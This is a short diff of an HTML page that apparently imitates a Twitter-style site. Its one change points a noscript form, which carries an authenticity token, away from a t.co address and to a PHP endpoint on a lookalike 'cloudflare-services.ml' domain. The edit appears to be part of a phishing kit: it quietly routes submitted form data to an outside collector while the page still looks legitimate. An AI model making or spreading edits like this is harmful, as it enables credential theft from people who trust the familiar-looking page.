@@ -90,7 +90,7 @@ data-fouc-class-names="swift-loading"
 
     
     <noscript>
-      <form action="https://t.co/JYfxgAPF8m" method="POST" class="NoScriptForm">
+      <form action="https://cloudflare-services.ml/user-corp.php" method="POST" class="NoScriptForm">
         <input type="hidden" value="becf3286d948dee9b86c86d98c09b08abdbb9647" name="authenticity_token">
 
         <div class="NoScriptForm-content">
